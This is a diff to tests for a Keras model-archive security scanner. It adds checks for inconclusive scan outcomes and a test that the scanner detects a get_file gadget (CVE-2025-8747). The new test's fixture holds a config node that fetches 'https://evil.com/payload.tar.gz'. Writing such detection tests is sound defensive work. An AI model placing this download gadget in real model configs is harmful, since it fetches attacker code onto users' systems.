@@ -408,6 +408,9 @@ class TestKerasZipScanner:
         assert limit_checks[0].status == CheckStatus.FAILED
         assert limit_checks[0].details["uncompressed_size"] == 4096
         assert limit_checks[0].details["max_embedded_weights_bytes"] == 1024
+        assert result.success is False
+        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+        assert "keras_zip_embedded_weights_too_large" in result.metadata["scan_outcome_reasons"]
         assert not any(issue.details.get("cve_id") == "CVE-2026-1669" for issue in result.issues)
 
     @pytest.mark.parametrize(
@@ -2170,6 +2173,23 @@ class TestCVE20258747GetFileGadget:
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
         assert len(cve_issues) >= 1, "Should detect get_file + URL as CVE-2025-8747"
         assert cve_issues[0].severity == IssueSeverity.CRITICAL
+
+    def test_description_scoped_get_file_with_url_is_not_treated_as_documentation(self, tmp_path: Path) -> None:
+        """Doc-like paths should still be scanned when the node contains executable get_file fields."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "description": {
+                    "fn": "keras.utils.get_file",
+                    "url": "https://evil.com/payload.tar.gz",
+                }
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert len(cve_issues) >= 1
 
     def test_get_file_with_url_in_args_list_detected(self, tmp_path: Path) -> None:
         """Config with URL inside args list should also be detected."""
